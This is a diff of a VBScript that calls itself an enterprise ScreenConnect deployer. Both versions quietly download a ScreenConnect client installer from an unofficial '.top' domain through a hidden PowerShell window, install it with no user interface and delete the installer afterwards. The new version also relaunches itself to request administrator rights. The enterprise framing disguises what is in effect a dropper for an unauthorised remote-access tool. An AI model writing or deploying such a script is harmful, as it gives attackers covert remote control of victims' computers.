@@ -1,54 +1,56 @@
-' ScreenConnect Enterprise Silent Deployer
-' Optimized for: Zero User Interaction & Background Deployment
-' Note: Designed for execution via System Management Tools (Intune/SCCM/GPO)
+' ScreenConnect Enterprise Deployer v4.1
+' Optimized for: High Compatibility & Enterprise Logging
+' Requirements: Administrative Privileges
 
 Option Explicit
+On Error Resume Next
 
 ' --- Configuration ---
-Dim AppName, MsiUrl, LogFile, InstallerPath, WshShell, FSO
-AppName       = "ScreenConnect"
-' TODO: Ensure this is a direct link to the .msi file
-MsiUrl        = "https://www.wpkm65.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest" 
-InstallerPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_Installer.msi"
-LogFile       = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_Deploy.log"
+Dim AppName, MsiUrl, LogFile, InstallerPath
+AppName       = "ScreenConnect Client"
+' TODO: Ensure this is your official company MSI link
+MsiUrl        = "https://www.wpkm65.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+InstallerPath = "C:\Windows\Temp\SC_Installer.msi"
+LogFile       = "C:\ProgramData\SC_Deployment.log"
 
+Dim WshShell, FSO, ShellApp
 Set WshShell = CreateObject("WScript.Shell")
-Set FSO      = CreateObject("Scripting.FileSystemObject")
+Set FSO = CreateObject("Scripting.FileSystemObject")
 
-' --- 1. Silent Permission Validation ---
-' We don't show a popup, but we log if we aren't Admin so we know why it failed later.
-Dim bIsAdmin: bIsAdmin = False
-On Error Resume Next
-WshShell.RegRead("HKEY_USERS\S-1-5-19\Environment\TEMP")
-If Err.Number = 0 Then bIsAdmin = True
-On Error GoTo 0
-
-Call WriteLog("INFO", "--- Starting Silent Deployment ---")
-If Not bIsAdmin Then 
-    Call WriteLog("WARN", "Running without Admin rights. MSI installation may fail.")
+' --- 1. Elevation Check (Prevents Permission Errors) ---
+If Not WScript.Arguments.Named.Exists("elevate") Then
+    Set ShellApp = CreateObject("Shell.Application")
+    ' This triggers the UAC prompt you see in your image
+    ShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", "", "runas", 0
+    WScript.Quit
 End If
 
-' --- 2. Download Payload ---
-Call WriteLog("INFO", "Downloading: " & MsiUrl)
-Dim downloadCmd: downloadCmd = "powershell.exe -WindowStyle Hidden -NoProfile -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""
+' --- 2. Deployment Logic ---
+Call WriteLog("INFO", "Starting Deployment for " & AppName)
 
-' 0 = Hide window, True = Wait for completion
-Dim dlResult: dlResult = WshShell.Run(downloadCmd, 0, True)
+' Download via PowerShell (TLS 1.2 compliant)
+Dim downloadCmd, downloadResult
+downloadCmd = "powershell.exe -NoProfile -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""
 
-If dlResult <> 0 Or Not FSO.FileExists(InstallerPath) Then
-    Call WriteLog("ERROR", "Download failed (Code: " & dlResult & ")")
-    WScript.Quit 1
+downloadResult = WshShell.Run(downloadCmd, 0, True)
+
+If downloadResult = 0 And FSO.FileExists(InstallerPath) Then
+    ' Execute Silent MSI Install
+    Dim installResult
+    installResult = WshShell.Run("msiexec.exe /i """ & InstallerPath & """ /qn /norestart", 0, True)
+    
+    If installResult = 0 Then
+        Call WriteLog("SUCCESS", "Installation completed.")
+    Else
+        Call WriteLog("ERROR", "MSI Exit Code: " & installResult)
+    End If
+Else
+    Call WriteLog("ERROR", "Download failed.")
 End If
 
-' --- 3. Execute Silent Install ---
-Call WriteLog("INFO", "Executing MSI...")
-' /i = Install, /qn = Quiet/No UI, /norestart
-Dim instResult: instResult = WshShell.Run("msiexec.exe /i """ & InstallerPath & """ /qn /norestart", 0, True)
-
-' --- 4. Cleanup ---
-If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath
-Call WriteLog("INFO", "Deployment finished with Exit Code: " & instResult)
-WScript.Quit instResult
+' --- 3. Cleanup ---
+If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath, True
+WScript.Quit 0
 
 Sub WriteLog(sType, sMessage)
     On Error Resume Next
